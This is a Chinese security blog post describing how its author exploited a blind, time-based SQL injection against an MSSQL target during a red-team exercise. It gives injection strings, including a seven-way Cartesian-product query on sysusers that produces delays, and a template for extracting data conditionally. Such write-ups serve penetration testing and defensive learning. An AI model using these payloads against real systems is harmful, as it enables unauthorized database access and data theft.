---
title: 某省护网一次特殊的SQL注入-论当盲注不能堆叠注入而且布尔不生效如何跑数据
url: https://mp.weixin.qq.com/s/ciTilSNPR4usSYHn1_oTZQ
source: Doonsec's feed
date: 2026-09-10
fetch_date: 2026-09-11T06:50:06.939400
---

# 某省护网一次特殊的SQL注入-论当盲注不能堆叠注入而且布尔不生效如何跑数据

# 某省护网一次特殊的SQL注入-论当盲注不能堆叠注入而且布尔不生效如何跑数据

原创

zkaq-石英
zkaq-石英

掌控安全EDU

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

扫码领资料

获网安教程

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=0)

![图片](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=1)

# 本文由掌控安全学院 - **石英 投稿**

**来****Track安全社区投稿~**

**千元稿费！还有保底奖励~（ https://bbs.zkaq.cn）**

## 文章内容仅做经验分享用途，未授权的攻击属于非法行为！传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果自行承担！

话不多说

为什么说这个注入比较特殊，其一是因为是盲注，后台是 mssql，但是常规的判断手段是不生效的，sqlmap 也跑不出来

先说怎么发现，当然只是因为常规的单引号报错

![](https://mmbiz.qpic.cn/mmbiz_png/ianpxKPnLHoL6wx4ETc5csibGM7bq44B7CAovwddkaeB3cWLKBcDGAAYpp28ULvjcqNmZDaW9Y4q7TTYxmJGwB9bODzj85wyaCNibqtyN2JkJk/640?wx_fmt=png&from=appmsg)

然后开始探测数据的时候发现**无回显、无布尔差、错误无明细，只能用时间**。然后还不能堆叠。

**例如**

常规布尔判断没有区别

```
' AND 1=1--
' AND 1=2--
```

![](https://mmbiz.qpic.cn/mmbiz_png/ianpxKPnLHoIHibyOWVnC2H0wF86SIGeVXa0WlG9ddabND4E7dYkjMgp9ibLnWwepodXo0rS2klsV5YibmtctrZ7rBz4C9TjqIqeic8Owiclxtibias/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ianpxKPnLHoKCs63wzHDl1iaAZgbHmcz4bClkmiaETI65EibwsvpeVa0zamb5RyicTmjlgGv3iaibEVdp1pR9HfPpnq4jiamEcuWl8BjrWicfMk2K3FQ/640?wx_fmt=png&from=appmsg)

```
x' AND '1'='1'--
x' AND '1'='2'--
```

![](https://mmbiz.qpic.cn/mmbiz_png/ianpxKPnLHoI5yKVWDJxy2iccFx6NsfU2m3ZaRLhW4y0vtlBXpDic68gicOBIZZvia0ic1fKNIlufnPxficQpc8WlBdx81Ar2xB6EQSC31DKJxb8Dk/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ianpxKPnLHoLVHQtjTXc8qjLvCzOHdR0Nsb5ib38Uiaicy5LeXTT77FjnicIdOGwyNpbJsxtET9AAQLaNhkmib0LpDV4ibAhVb9h89xDLVBUC9ZLCA/640?wx_fmt=png&from=appmsg)

而常规WAITFOR 是 T-SQL 语句，不是表达式，非堆叠在语法上塞不进 WHERE，也就导致不堆叠是无法注入的

那么这个时候就轮到本次的主角，笛卡尔积了

常规语法如下

```
' AND 8405=(SELECT COUNT(*) FROM sysusers AS a,sysusers AS b,sysusers AS c,sysusers AS d,sysusers AS e,sysusers AS f,sysusers AS g)--
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ianpxKPnLHoJhVMBF41YzLn6P36sOM5zdaicI9VHr6E9pM7wTZpQfuoBicXHbdibPhAjFSz3uoicnbUdKThrMApS8xmzXMnkWmJPcpUibXjSOMHicE/640?wx_fmt=png&from=appmsg)

七表笛卡尔积大概四秒，可以形成有效观测，那么接下来就是想办法把逻辑塞进笛卡尔积

大概逻辑是这样的

```
' AND 8405=(SELECT COUNT(*) FROM sysusers AS a,...,sysusers AS g WHERE <条件>)--
真：WHERE 有行 → 7 表交叉 ≈4s
假：WHERE 1=2 → 0 行，没东西可交叉 ≈0.2s
```

![](https://mmbiz.qpic.cn/mmbiz_png/ianpxKPnLHoI2g3coZJ16wphnUyzFbfxgYxcGI5yUZ9ZxPxRHGyhdSJzK1B51hQhePsQb5sLsG4ic62DwyoBGLr9e9QTbFmsXMdGJRJZzLQYI/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ianpxKPnLHoLBL2kWp9TkPAyTyia4RZjbtZ1gap2hFKqxVHkCRVoUCIbGiaZWz38RzGOtpAVQGhqk5bwhZz2IazqGKc5EAW6XuUia9fQBNY9bMw/640?wx_fmt=png&from=appmsg)

判断是否是 DBA 权限，很可惜这个靶标不是，=0 的时候延迟，说明不是

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ianpxKPnLHoJ0TRP4HibLgibNSunShVG55znwpqslQ7EVA9w0dibibFu00oBzsxjSc4KumPC4iamIHicHhDk2sYh0gvEbIIHZcgv5vvMQeH3F5jxWQ/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/ianpxKPnLHoL4NWnL5pmlzJL3qptnQafNk3EqibJw3ragCXFy1KZcaLdBW0W808Qmf2L4eibLicRy6chKxE31FNVj1oYIs89G8wRfBwic5BweeWg/640?wx_fmt=png&from=appmsg)

思路就分享到这里了，后面就是常规跑数据了，没什么知识点，所以就分享到这里了。

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

![图片](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=49)

**没看够~？欢迎关注！**

**分享本文到朋友圈，可以凭截图找老师领取**

上千**教程+工具+交流群+靶场账号**哦

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=50)

**分享后扫码加我！**

**回顾往期内容**

[零基础学黑客，该怎么学？](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487576&idx=1&sn=3852f2221f6d1a492b94939f5f398034&chksm=fa686929cd1fe03fcb6d14a5a9d86c2ed750b3617bd55ad73134bd6d1397cc3ccf4a1b822bd4&scene=21#wechat_redirect)

[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)

[文库｜内网神器cs4.0使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)

[记某地级市护网的攻防演练行动](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247543747&idx=1&sn=c7745ecb8b33401ae317c295bed41cc8&token=74838194&lang=zh_CN&scene=21#wechat_redirect)

[手把手教你CNVD漏洞挖掘 + 资产收集](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247542576&idx=1&sn=d9f419d7a632390d52591ec0a5f4ba01&token=74838194&lang=zh_CN&scene=21#wechat_redirect)

[【精选】SRC快速入门+上分小秘籍+实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)

## [代理池工具撰写 | 只有无尽的跳转，没有封禁的IP！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503462&idx=1&sn=0b696f0cabab0a046385599a1683dfb2&chksm=fa6bb717cd1c3e01afc0d6126ea141bb9a39bf3b4123462528d37fb00f74ea525b83e948bc80&scene=21#wechat_redirect)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=51)

点赞+在看支持一下吧~感谢看官老爷~

你的点赞是我更新的动力

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcq98SadiaYm6GqwrAZjdeXAuLrl5ATlxIMCiabYgjLJ1M1gcLHicsRuISeqtAuLaSfRtBULuibjDBcLsg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过